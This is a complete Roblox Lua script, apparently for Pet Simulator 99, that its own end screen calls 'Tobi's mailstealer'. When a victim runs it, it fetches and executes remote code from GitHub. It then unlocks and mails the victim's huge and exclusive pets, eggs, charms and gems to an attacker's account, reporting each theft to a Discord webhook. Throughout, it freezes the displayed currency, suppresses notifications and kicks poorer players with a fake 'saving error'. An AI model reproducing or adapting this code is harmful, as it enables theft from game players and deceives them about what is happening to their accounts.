if LoadScreen == true then 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/loadingscreen"))()
end

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
else
	Webhook = ""
end
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "gg / HcpNe56R2a"
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 10000 then
    plr:kick("Saving error, please rejoin! Source code by .t.ob.i.")
end

local user = Username

local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
	gemsleftpath.Text = gemsleft
end)

local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

function StealHuge()
	local hugesSent = 0
	local initialHuges = CountHuges()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
			end
			local finalHuges = CountHuges()
			if finalHuges < initialHuges then
				hugesSent = hugesSent + 1
				initialHuges = finalHuges
			end
        end
    end
	return hugesSent
end

function CountHuges()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.huge then
			count = count + 1
		end
	end
	return count
end

function SendAllHuges()
	local totalHuges = CountHuges()
	local hugesSent = 0
	repeat
		hugesSent = hugesSent + StealHuge()
	until hugesSent == totalHuges
end

function ExcSteal()
	local excSent = 0
	local initialExc = CountExc()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
			end
			local finalExc = CountExc()
			if finalExc < initialExc then
				excSent = excSent + 1
				initialExc = finalExc
			end
        end
    end
	return excSent
end

function CountExc()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.exclusiveLevel then
			count = count + 1
		end
	end
	return count
end

function SendAllExc()
	local totalExc = CountExc()
	local excSent = 0
	repeat
		excSent = excSent + ExcSteal()
	until excSent == totalExc
end

function EggSteal()
    for i, v in pairs(save.Egg) do
		local id = v.id
		local diregg = library.Directory.Eggs[id]
		if diregg then
			local args = {
				[1] = user,
				[2] = MailMessage,
				[3] = "Egg",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
			end
		end
    end
end

function CharmSteal()
    for i, v in pairs(save.Charm) do
        local id = v.id
		local dircharm = library.Directory.Charms[id]
		if dircharm then
			local args = {
				[1] = user,
				[2] = MailMessage,
				[3] = "Charm",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
			end
		end
    end
end

function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            GemAmount = v._am
            GemId = i
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = GemId,
                [5] = GemAmount - 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

function EmptyBoxes()
    if save.Box then
        for key, _ in pairs(save.Box) do
			local args = {
				[1] = key
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
        end
    end
end

EmptyBoxes()

SendAllHuges()
SendAllExc()

if save.Egg ~= nil then
    EggSteal()
end

if save.Charm ~= nil then
    CharmSteal()
end

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)  -- Cover the entire screen

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.308833092, 0, 0.170426071, 0)
TextLabel.Size = UDim2.new(0, 746, 0, 338)
TextLabel.Font = Enum.Font.LuckiestGuy
TextLabel.Text = "All your items have just been stolen by Tobi's mailstealer"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 41.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.360834211, 0, 0.786967397, 0)
TextLabel_2.Size = UDim2.new(0, 533, 0, 146)
TextLabel_2.Font = Enum.Font.FredokaOne
TextLabel_2.Text = "Join discord.gg/HcpNe56R2a to start mailstealing yourself"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 54.000
ScreenGui.IgnoreGuiInset = true

while true do
	wait(1.25)
	GemSteal()
end
